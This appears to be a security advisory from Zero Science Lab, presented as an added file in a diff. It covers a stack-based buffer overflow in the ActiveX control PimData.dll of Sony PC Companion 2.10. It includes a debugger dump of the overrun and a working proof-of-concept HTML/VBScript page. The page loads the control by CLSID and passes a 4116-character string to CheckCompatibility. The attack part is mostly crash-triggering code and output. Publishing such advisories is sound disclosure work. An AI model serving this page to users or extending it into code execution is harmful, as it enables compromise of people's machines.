@@ -1,0 +1,80 @@
+Sony PC Companion 2.1 (CheckCompatibility()) Stack-based Unicode Buffer Overload
+
+
+Vendor: Sony Mobile Communications AB
+Product web page: http://www.sonymobile.com
+Affected version: 2.10.115 (Production 27.1, Build 830)
+                  2.10.108 (Production 26.1, Build 818)
+
+Summary: PC Companion is a computer application that acts as a portal
+to Sony Xperia and operator features and applications, such as phone
+software updates, management of contacts and calendar, media management
+with Media Go, and a backup and restore feature for your phone content.
+
+Desc: The vulnerability is caused due to a boundary error in PimData.dll
+when handling the value assigned to the 'OrgHeartBeat' item in the
+CheckCompatibility function and can be exploited to cause a stack-based
+buffer overflow via an overly long string which may lead to execution of
+arbitrary code on the affected machine.
+
+
+------------------------------------------------------------------------------
+
+STATUS_STACK_BUFFER_OVERRUN encountered
+(1214.1688): Break instruction exception - code 80000003 (first chance)
+eax=00000000 ebx=5fcf2b80 ecx=75b1de28 edx=0012e12d esi=00000000 edi=001f9ec4
+eip=75b1dca5 esp=0012e374 ebp=0012e3f0 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+KERNEL32!FormatMessageA+0x13c85:
+75b1dca5 cc              int     3
+0:000> d edi
+001f9ec4  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+001f9ed4  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+001f9ee4  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+001f9ef4  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+001f9f04  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+001f9f14  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+001f9f24  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+001f9f34  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+0:000>
+
+------------------------------------------------------------------------------
+
+
+Tested on: Microsoft Windows 7 Ultimate SP1 (EN) 32bit
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2012-5119
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2012-5119.php
+
+http://cwe.mitre.org/data/definitions/121.html
+
+
+09.11.2012
+
+---
+
+
+<html>
+<body>
+<object classid='clsid:A70D160E-E925-4207-803B-A0D702BEDF46' id='overrun' />
+<script language='vbscript'>
+targetFile = "C:\Program Files\Sony\Sony PC Companion\PimData.dll"
+prototype  = "Function CheckCompatibility ( ByVal OrgHeartBeat As String ,  ByVal OrgScriptFile As String ,  ByVal DataTypes As Long ) As Boolean"
+memberName = "CheckCompatibility"
+progid     = "PimDataLib.PhoneDataProviderInfo"
+argCount   = 3
+
+OrgHeartBeat=String(4116, "A")
+OrgScriptFile="defaultV"
+DataTypes=1
+
+overrun.CheckCompatibility OrgHeartBeat, OrgScriptFile, DataTypes
+
+</script>
+</body>
+</html>
